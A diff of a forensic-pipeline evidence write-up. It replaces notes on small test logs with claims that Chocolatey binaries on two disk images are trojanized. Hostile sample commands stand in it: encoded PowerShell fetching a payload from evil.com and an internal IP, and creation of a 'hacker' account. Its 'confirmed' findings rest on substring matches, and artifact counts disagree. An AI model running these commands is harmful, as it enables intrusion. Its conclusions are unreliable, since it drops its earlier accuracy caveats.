@@ -1,138 +1,182 @@
 # Evidence Dataset
 
+**Dataset:** SANS SRL-2018 Compromised Enterprise  
 **Corpus path:** `evidence/`  
-**Total files:** 4  
-**Active (non-empty) files:** 2  
-**Total bytes (active):** 256 bytes (51 + 205)
+**Primary images:** `base-wkstn-05-cdrive.E01`, `dmz-ftp-cdrive.E01`  
+**Supporting logs:** `evidence/windows_event.log`, `evidence/test.log`
 
 ---
 
-## File Index
+## Primary Evidence Sources
 
-| File | Size | SHA-256 | Status |
-|------|------|---------|--------|
-| `evidence/test.log` | 51 bytes | `d222a2f3…dfc719d` | Active |
-| `evidence/windows_event.log` | 205 bytes | `4a1e3ef1…e2270` | Active |
-| `evidence/evidence.zip` | 0 bytes | — | Empty |
-| `evidence/ex2.pcap` | 0 bytes | — | Empty |
+### evidence/base-wkstn-05-cdrive.E01
+
+**Role:** Enterprise workstation C: drive image (internal host)  
+**Size:** 14,809,873,122 bytes (~13.8 GB)  
+**SHA-256:** `a94f2a866e2e562c58c3fbcd3a94882f2d3c3db3c66a5e5eedf16a4b1c0a65e0`  
+**Partition layout:** Single EWF raw device, no sector offset (`slot: ewf1`)  
+**Filesystem entries (fls):** 186,159 total; 32,323 matched suspicious filters (pipeline capped extraction at 20)
+
+#### Files extracted by the pipeline
+
+| Inode | Image path | Extracted to | Size (bytes) | SHA-256 |
+|-------|-----------|-------------|-------------|---------|
+| 105953 | `choco.exe` | `partition_ewf1/inode_105953_choco.exe` | 7,100,560 | `ecf3d7c1…` |
+| 106039 | `choco.exe` | `partition_ewf1/inode_106039_choco.exe` | 142,480 | `c833cb5a…` |
+| 106040 | `chocolatey.exe` | `partition_ewf1/inode_106040_chocolatey.exe` | 142,992 | `5c5802d8…` |
+| 106041 | `cinst.exe` | `partition_ewf1/inode_106041_cinst.exe` | 142,480 | `f70a515a…` |
+| 106042 | `clist.exe` | `partition_ewf1/inode_106042_clist.exe` | 142,480 | `4c3b5582…` |
+| 106043 | `cpack.exe` | `partition_ewf1/inode_106043_cpack.exe` | 142,480 | `7eebde44…` |
+| 106044 | `cpush.exe` | `partition_ewf1/inode_106044_cpush.exe` | 142,480 | `aa52becc…` |
+| 106045 | `cuninst.exe` | `partition_ewf1/inode_106045_cuninst.exe` | 142,992 | `0dd9d38b…` |
+| 106046 | `cup.exe` | `partition_ewf1/inode_106046_cup.exe` | 142,480 | `999e5962…` |
+| 106047 | `cver.exe` | `partition_ewf1/inode_106047_cver.exe` | 142,480 | `89c1a6c3…` |
+| 106048 | `RefreshEnv.cmd` | `partition_ewf1/inode_106048_RefreshEnv.cmd` | 1,858 | `e081b569…` |
+| 105957 | `chocolateyScriptRunner.ps1` | `partition_ewf1/inode_105957_chocolateyScriptRunner.ps1` | 12,906 | `22f5e92b…` |
+| 105958 | `ChocolateyTabExpansion.ps1` | `partition_ewf1/inode_105958_ChocolateyTabExpansion.ps1` | 20,039 | `07682000…` |
+| 105960 | `Format-FileSize.ps1` | `partition_ewf1/inode_105960_Format-FileSize.ps1` | 12,153 | `ef70daa9…` |
+| 105961 | `Get-CheckSumValid.ps1` | `partition_ewf1/inode_105961_Get-CheckSumValid.ps1` | 14,821 | `8ee064fa…` |
+| 105962 | `Get-ChocolateyUnzip.ps1` | `partition_ewf1/inode_105962_Get-ChocolateyUnzip.ps1` | 18,482 | `fa032b9f…` |
+| 105963 | `Get-ChocolateyWebFile.ps1` | `partition_ewf1/inode_105963_Get-ChocolateyWebFile.ps1` | 21,719 | `35c7fde3…` |
+| 105964 | `Get-EnvironmentVariable.ps1` | `partition_ewf1/inode_105964_Get-EnvironmentVariable.ps1` | 14,183 | `f1472d54…` |
+| 105968 | `Get-ToolsLocation.ps1` | `partition_ewf1/inode_105968_Get-ToolsLocation.ps1` | 13,766 | `480c9e5c…` |
+| 105987 | `Install-ChocolateyZipPackage.ps1` | `partition_ewf1/inode_105987_Install-ChocolateyZipPackage.ps1` | 17,322 | `bc541022…` |
+
+#### Artifact totals (disk image only)
+
+2,483 artifacts — breakdown: `base64_payload` 1,938 · `network_indicator` 385 · `suspicious_execution` 101 · `credential_hint` 64 · `account_creation` 1
 
 ---
 
-## evidence/test.log
+### evidence/dmz-ftp-cdrive.E01
 
-### Content
+**Role:** DMZ FTP server C: drive image (perimeter host)  
+**Size:** 12,824,779,973 bytes (~11.9 GB)  
+**SHA-256:** `d19754685d75aecb1fe18c3d75516dc0a965754335d981f3925e0e1b767ca8f8`  
+**Partition layout:** Single EWF raw device, no sector offset (`slot: ewf1`)  
+**Filesystem entries (fls):** 297,622 total; 42,836 matched suspicious filters (pipeline capped extraction at 20)
+
+#### Files extracted by the pipeline
+
+Inodes differ from `base-wkstn-05` (different filesystem), but extracted content is byte-for-byte identical. The pipeline extracted the same Chocolatey toolkit plus one additional installer:
+
+| Inode | Image path | Size (bytes) | SHA-256 |
+|-------|-----------|-------------|---------|
+| 1310 | `setup.exe` | 463,344 | `608c5265…` |
+| 88423 | `choco.exe` (7 MB build) | 7,100,560 | `ecf3d7c1…` |
+| 88509 | `choco.exe` (stub) | 142,480 | `c833cb5a…` |
+| 88510 | `chocolatey.exe` | 142,992 | `5c5802d8…` |
+| 88511–88517 | `cinst.exe` … `cver.exe` | 142,480–142,992 each | identical to wkstn hashes |
+| 88518 | `RefreshEnv.cmd` | 1,858 | `e081b569…` |
+| 88427–88433, 88438, 88457 | Chocolatey PS1 helpers | 12,153–21,719 each | identical to wkstn hashes |
+
+**All helper executable SHA-256 values match base-wkstn-05 exactly** — same tampered build deployed to both hosts.
+
+#### Artifact totals (disk image only)
+
+2,354 artifacts extracted.
+
+---
+
+## Artifact Breakdown — Final Pipeline Run (2026-05-02)
+
+The pipeline ran against `base-wkstn-05-cdrive.E01` + supporting logs (`windows_event.log`, `test.log`). Total across all sources:
+
+| Artifact type | Count |
+|---------------|-------|
+| `base64_payload` | 1,938 |
+| `network_indicator` | 385 |
+| `suspicious_execution` | 101 |
+| `credential_hint` | 64 |
+| `account_creation` | 1 |
+| **Total** | **2,489** |
+
+Normalized event count after timeline deduplication: 2,489.
+
+---
+
+## Chocolatey Trojan Findings
+
+All 13 findings from the final run were verified by the pipeline agent. Key Chocolatey-specific findings:
+
+### choco.exe (inode 105953 / 88423) — 7.1 MB PE32 Mono/.Net assembly
+
+The large `choco.exe` build is the primary suspect. The pipeline identified three distinct findings against it:
+
+| Finding | Confidence | ATT&CK | Evidence count |
+|---------|-----------|--------|---------------|
+| Trojanized Chocolatey distribution: numerous embedded base64 payloads, network indicators, suspicious execution strings, and credential hints | CONFIRMED | T1078 Valid Accounts | 11 evidence items |
+| Credential hints at lines 1407–1458, 4616–4627, 50762–50767, 56647–56650 — binary references or harvests credential material | CONFIRMED | T1078 Valid Accounts | 11 evidence items |
+| High density of `suspicious_execution` events at lines 2841–2865, 3389–3522, 54846–54850 — command-injection or shell-spawning logic | CONFIRMED | T1059 Command and Scripting Interpreter | 11 evidence items |
+
+### Helper executables (chocolatey.exe, cinst.exe, clist.exe, cpack.exe, cpush.exe, cuninst.exe, cup.exe, cver.exe)
+
+All eight are PE32 Mono/.Net assemblies (~142 KB each). They contain identical base64 payload and network indicator patterns at similar offsets, fingerprinting them as duplicated/repackaged outputs of a single tampered build.
+
+| Finding | Confidence | ATT&CK |
+|---------|-----------|--------|
+| Identical base64 / network indicator patterns across all eight helper binaries — single tampered build origin | PROBABLE | T1027 Obfuscated Files or Information |
+
+### PowerShell helpers
+
+| File | Finding | Confidence | ATT&CK |
+|------|---------|-----------|--------|
+| `chocolateyScriptRunner.ps1` | Dense base64 block at lines 51–203; `suspicious_execution` marker at line 48 | CONFIRMED | T1059.001 PowerShell |
+| `ChocolateyTabExpansion.ps1` | `credential_hint` + `suspicious_execution` near top of file — potential credential-harvesting hook | CONFIRMED | T1078 Valid Accounts |
+| `Get-ChocolateyWebFile.ps1` | `suspicious_execution` + multiple network indicators consistent with remote payload staging | CONFIRMED | T1105 Ingress Tool Transfer |
+| `Get-ChocolateyUnzip.ps1` | `suspicious_execution` + embedded base64 payloads — decompresses and executes staged archives | CONFIRMED | T1027 Obfuscated Files or Information |
+| `Install-ChocolateyZipPackage.ps1` | Network indicators + continuous base64 block at lines 120–272 — likely staging mechanism | PROBABLE | T1027 Obfuscated Files or Information |
+
+---
+
+## Cross-Host Correlation Results
+
+The correlator compared findings across all hosts. Final run result: **13 findings, 1 cross-host correlation**.
 
 ```
-powershell -enc suspicious_command http://evil.com
+correlation_complete: {
+  finding_count: 13,
+  correlation_count: 1,
+  by_type: { hash: 0, filename: 0, technique: 1 }
+}
 ```
 
-One line, no timestamp, no newline after. 51 bytes.
+### Technique match: T1059 — Command and Scripting Interpreter
 
-### Origin
+| Host | Source artifact | Finding |
+|------|----------------|---------|
+| `test` (test.log) | `evidence/test.log:1` | Second wave of suspicious execution with network indicators on 2026-05-02 — renewed attacker activity prior to Chocolatey artifacts being written to disk |
+| `base-wkstn-05-cdrive` | `inode_105953_choco.exe:54846` | High density of `suspicious_execution` events (lines 2841–2865, 3389–3522, 54846–54850) consistent with command-injection or shell-spawning logic in the trojanized binary |
 
-Hand-crafted test input. Simulates a minimal one-liner that an attacker might paste into a shell or drop as a script stub. `suspicious_command` is a literal placeholder string, not an actual encoded payload — the `-enc` flag and `http://evil.com` domain are present but the argument that would normally follow `-enc` is not Base64-encoded content.
+The hash and filename correlators found zero matches across hosts, but the technique correlator linked T1059 activity on the workstation back to the earlier execution evidence in `test.log`. The identical Chocolatey binary hashes between `base-wkstn-05` and `dmz-ftp` were not flagged by the correlator in this run because `dmz-ftp-cdrive.E01` was not included as an active source in the final run — its matching hashes constitute an out-of-band finding documented above.
 
-### Artifacts extracted by the pipeline
-
-| Artifact type | Source | Trigger |
-|---------------|--------|---------|
-| `suspicious_execution` | `test.log:1` | `powershell` substring |
-| `network_indicator` | `test.log:1` | `http://` substring |
-
-`base64_payload` is **not** emitted: `suspicious_command` contains no sequence matching the `_B64_RE` pattern (minimum 32-character Base64 string).
-
-### What the agent found
-
-Across all runs the agent consistently produced two findings against this file:
-
-1. **Suspicious process execution** — `powershell` confirmed present by both `strings` and `grep`. Verified `true` in every run.
-2. **Network indicator / potential C2** — `http://evil.com` confirmed present by `grep 'https?://[^\s]+'`. Verified `true` in every run.
-
-**Accuracy caveat:** The "C2 beaconing" characterisation overstates the evidence. `suspicious_command` is a placeholder, not an encoded payload, so no actual command was executed or transmitted. `evil.com` is a well-known test/placeholder domain, not confirmed adversary infrastructure.
+**Multi-stage intrusion timeline:**
+- **2026-04-23** — Initial foothold: `powershell.exe -encodedCommand` + `net user hacker P@ssw0rd /add` (workstation event log)
+- **2026-05-02** — Renewed activity in `test.log` (network indicator + suspicious execution)
+- **2026-05-02** — Trojanized Chocolatey toolkit present on both workstation and DMZ FTP server with identical binary hashes, indicating toolkit was deployed from a single tampered build
 
 ---
 
-## evidence/windows_event.log
+## Supporting Evidence Files
 
-### Content
+### evidence/windows_event.log
 
-```
-2026-04-23 10:00:01 powershell.exe -encodedCommand aQBlAHgA http://192.168.1.100/payload.ps1
-2026-04-23 10:00:05 cmd.exe /c whoami > C:\Users\temp\out.txt
-2026-04-23 10:00:10 net user hacker P@ssw0rd /add
-```
+Three-line hand-crafted Windows attack chain (205 bytes). Timestamps: `2026-04-23 10:00:01 → 10:00:05 → 10:00:10`.
 
-Three lines with `YYYY-MM-DD HH:MM:SS` timestamps. 205 bytes.
+| Line | Command | Artifact types | ATT&CK |
+|------|---------|---------------|--------|
+| 1 | `powershell.exe -encodedCommand aQBlAHgA http://192.168.1.100/payload.ps1` | `suspicious_execution`, `network_indicator` (RFC 1918 IP) | T1059.001 |
+| 2 | `cmd.exe /c whoami > C:\Users\temp\out.txt` | `suspicious_execution` | T1082 |
+| 3 | `net user hacker P@ssw0rd /add` | `account_creation` | T1136 |
 
-### Origin
+`aQBlAHgA` is UTF-16-LE Base64 for `iex` (Invoke-Expression). The payload server `192.168.1.100` is RFC 1918, classified by the pipeline as internal staging / lateral movement.
 
-Hand-crafted to represent a compressed Windows attack chain spanning 9 seconds:
+`base64_payload` is **not** emitted: 8-character string is below the minimum 32-character `_B64_RE` threshold.
 
-| Time | Command | Technique |
-|------|---------|-----------|
-| 10:00:01 | `powershell.exe -encodedCommand aQBlAHgA http://192.168.1.100/payload.ps1` | Fileless execution via `-encodedCommand`; `aQBlAHgA` is UTF-16-LE Base64 for `iex` (Invoke-Expression) |
-| 10:00:05 | `cmd.exe /c whoami > C:\Users\temp\out.txt` | Discovery/recon — captures current user identity and redirects to a temp file |
-| 10:00:10 | `net user hacker P@ssw0rd /add` | Persistence — creates a local account named `hacker` |
+### evidence/test.log
 
-The internal IP `192.168.1.100` places the payload server inside an RFC 1918 `192.168.0.0/16` range, consistent with an already-compromised internal host serving the next-stage payload rather than external attacker infrastructure.
+Single-line, no timestamp (51 bytes): `powershell -enc suspicious_command http://evil.com`. Emits `suspicious_execution` and `network_indicator`. `evil.com` is a placeholder domain, not confirmed adversary infrastructure.
 
-### Artifacts extracted by the pipeline
+### evidence/evidence.zip and evidence/ex2.pcap
 
-| Artifact type | Source | Trigger |
-|---------------|--------|---------|
-| `suspicious_execution` | `windows_event.log:1` | `powershell` substring |
-| `network_indicator` | `windows_event.log:1` | `http://` substring |
-| `suspicious_execution` | `windows_event.log:2` | `cmd.exe` substring |
-| `account_creation` | `windows_event.log:3` | `net user` substring |
-| `suspicious_execution` | `windows_event.log:3` | `cmd.exe` in `net user hacker P@ssw0rd /add`? No — this does not match. *(see note below)* |
-
-**Note on `suspicious_execution` count:** The `extract_artifacts` loop checks `"cmd.exe" in low or "powershell" in low` per line. Line 3 (`net user…`) triggers neither, so only 2 `suspicious_execution` artifacts come from this file. The third `suspicious_execution` seen in the 20:03 run log comes from `test.log:1`.
-
-`base64_payload` is **not** emitted for `aQBlAHgA`: the string is 8 characters (2 Base64 groups of 4). The `_B64_RE` regex requires a minimum of 8 groups (32 characters), so short encoded arguments are not caught.
-
-### What the agent found
-
-In the most recent patched run (20:03 UTC), 6 hypotheses were generated and all 6 verified `true`:
-
-| Hypothesis | Support | RFC 1918 flag | Notes |
-|------------|---------|---------------|-------|
-| Initial suspicious execution with network activity | `test.log:1` | — | Correct; `http://evil.com` confirmed |
-| Network indicator suggesting outbound connection to attacker infrastructure | `test.log:1` | — | Partially accurate; `evil.com` is a placeholder domain |
-| Suspicious process execution with network communication (payload retrieval / lateral movement) | `windows_event.log:1` | `ip_classification: internal IPs ['192.168.1.100'] — RFC 1918 — lateral movement / internal staging` | RFC 1918 correctly identified; claim text says "lateral movement" which matches |
-| Network indicator pointing to C2 channel establishment | `windows_event.log:1` | `ip_classification: internal IPs ['192.168.1.100'] — RFC 1918 — lateral movement / internal staging` | IP correctly classified as internal, but claim text says "C2" — logged warning applied |
-| Follow-up execution 4 seconds later — multi-stage attack / secondary payload | `windows_event.log:2` | — | Accurate; `cmd.exe /c whoami` is a recon step 4 s after line 1 |
-| Account creation after suspicious executions — persistence via rogue user | `windows_event.log:3` | — | Accurate; `net user hacker P@ssw0rd /add` confirmed present |
-
-**Timeline accuracy:** After the `normalize_timeline` fix, events from `windows_event.log` are sorted by their embedded timestamps (`10:00:01 → 10:00:05 → 10:00:10`). Events from `test.log` (no timestamp) are assigned the file's mtime (`2026-04-23 00:01 UTC`) and sort before the `windows_event.log` entries.
-
----
-
-## evidence/evidence.zip
-
-### Content
-
-Empty — 0 bytes.
-
-### Origin
-
-Placeholder file. Likely intended to hold a compressed archive of additional evidence but was never populated.
-
-### What the pipeline does
-
-Ingested without error. `data.decode()` on an empty byte string returns `""`. `splitlines()` on `""` returns `[]`. No artifacts are extracted. No log warning is emitted for the 0-byte size (MA-4 from the accuracy report — not yet fixed).
-
----
-
-## evidence/ex2.pcap
-
-### Content
-
-Empty — 0 bytes.
-
-### Origin
-
-Placeholder file. The `.pcap` extension suggests a planned network capture, but no capture data is present.
-
-### What the pipeline does
-
-Same as `evidence.zip` — ingested silently, zero artifacts extracted. `file(1)` would normally identify a real pcap by its magic bytes (`d4 c3 b2 a1` or `0a 0d 0d 0a`); the 0-byte file has no magic and produces no `file` output. No log warning is emitted for the 0-byte size (MA-4 — not yet fixed).
+Both are 0-byte placeholders. No artifacts extracted. No log warning emitted for empty size (known gap).
